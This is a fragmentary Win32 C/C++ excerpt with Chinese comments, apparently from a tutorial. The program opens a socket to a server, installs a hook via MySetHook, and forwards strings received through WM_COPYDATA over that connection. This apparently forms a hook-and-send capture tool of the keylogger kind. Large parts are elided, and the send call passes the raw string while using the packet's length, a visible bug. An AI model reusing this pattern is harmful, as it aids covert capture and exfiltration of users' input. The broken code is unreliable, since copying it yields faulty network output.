                     ...
                     _In_ int       nCmdShow)
{
	...
	//connect主动连接服务器
	sockaddr_in  addr = { 0 };									//替换sockaddr结构体
...
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   ...
   //开始处理HOOK操作,钩子链,谁最后下钩子,谁最先被调用
   BOOL bRer = MySetHook(g_hWnd);
...
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	...
	case WM_COPYDATA:
	{
		...
		pPkt->length = strlen(pStr) + 1;	//仅仅表示数据长度不包括结构体头部的前面2个4个字节
		memcpy(pPkt->data,pStr, pPkt->length);	//将数据拷贝给包
		send(s,
			(const char*)(pStr),	//发送的内容 
			pPkt->length + sizeof(unsigned int) * 2,		//发送的长度
			0);
